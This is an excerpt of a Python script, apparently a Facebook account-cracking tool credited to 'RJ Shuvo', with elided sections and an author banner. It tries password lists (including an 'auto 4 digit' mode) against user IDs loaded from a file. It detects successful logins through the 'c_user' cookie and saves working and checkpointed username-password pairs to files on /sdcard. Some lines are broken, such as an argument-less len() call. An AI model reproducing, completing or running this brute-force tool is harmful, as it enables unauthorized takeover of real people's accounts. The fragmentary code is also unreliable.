...
import os,sys
try: import requests
except ModuleNotFoundError:print("hamii Install Module requests");os.system("python -m pip install requests &> /dev/SOmii")
try: import bs4
except ModuleNotFoundError:print("hamii Install Module bs4");os.system("python -m pip install bs4 &> /dev/SOmii")
try: import mechanize
except ModuleNotFoundError:print("hamii Install Module mechanize");os.system("python -m pip install mechanize &> /dev/SOmii")
try: import gTTS
except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/SOmii")
## import in
...
def main_apv():
    ...
    r1=requests.get("https://github.com/RJ-Shuvo/RJ-File01/blob/main/Approved.txt").text
    if key1 in r1:
        R()
    else:
        os.system("clear")
...
class __crack__:
	...
	def plerr(self):
		try:
			self.apk = input(" \033[1;96m[*] PUT FILE: ")
			print (' \033[1;96m[*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡')
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;32m[ RJ] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m'%(loop,len(self.id),len(ok),len())),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[SHUVO] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/SHUVO_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
				...
				try:
					...
					cp.append(wrt)
					open('/sdcard/SHUVO_CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[SHUVO-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user)))
	...
	def __pler__(self):
		...
		print (" [4] Auto 4 Digit Pass [ VER SLOW]")
		yan = input('\n [•] \033[1;37m CHOICE: ')
		if yan == '':
			print('\Choose Error ')
			exit()
...
\033[1;98m$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |\$$$ |$$ |  $$ |
\033[1;93m$$$$$$$  |$$ |  $$ |$$ |  $$ |$$ | \$$ |$$$$$$$  |
\033[1;96m\_______/ \__|  \__|\__|  \__|\_                                  
\033[1;37m ｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡
\033[1;95m ⇨AUTHOR    : RJ SHUVO
\033[1;95m ⇨WHATSAPP  : 01950908973
\033[1;93m ⇨FACEBOOK  : RJ Shuvo
\033[1;92m ⇨GITHB      : RJ-Shuvo
\033[1;98m ⇨VERSION   : 3.0.1
\
\033[1;37m ｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡"""
ct = datetime.now()
n = ct.month
